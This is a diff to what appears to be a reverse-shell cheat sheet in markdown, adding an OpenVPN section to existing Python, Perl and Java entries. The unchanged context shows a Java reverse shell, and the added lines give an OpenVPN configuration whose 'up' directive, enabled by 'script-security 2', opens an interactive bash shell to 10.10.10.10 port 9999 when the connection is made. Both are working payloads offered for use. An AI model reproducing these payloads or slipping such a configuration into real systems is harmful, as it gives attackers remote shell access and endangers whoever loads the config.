@@ -5,6 +5,7 @@
 2. [Python](#python)
 3. [Perl](#perl)
 4. [Java](#java)
+5. [OpenVPN](#openvpn)
 
 
 
@@ -60,4 +61,17 @@
 r = Runtime.getRuntime()
 	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/9999;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 	p.waitFor()
+```
+
+## OpenVPN
+
+This will execute the command on the vpn server when the connection is made, please, replace the "<<things>>" (: !
+
+```
+remote <<VPNSERVER>>
+ifconfig <<ip to assign>> <<ip to assign>>
+dev tun
+script-security 2
+up "/bin/bash -c '/bin/bash -i &> /dev/tcp/10.10.10.10/9999 0<&1 2>&1&'"
+nobind
 ```
